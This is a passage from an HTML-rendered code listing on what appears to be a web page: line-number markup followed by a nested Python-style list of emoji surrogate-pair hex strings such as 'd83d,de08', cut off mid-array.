class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br></pre></td><td class="code"><pre><span class="line">s = [[</span><br><span class="line">        <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span 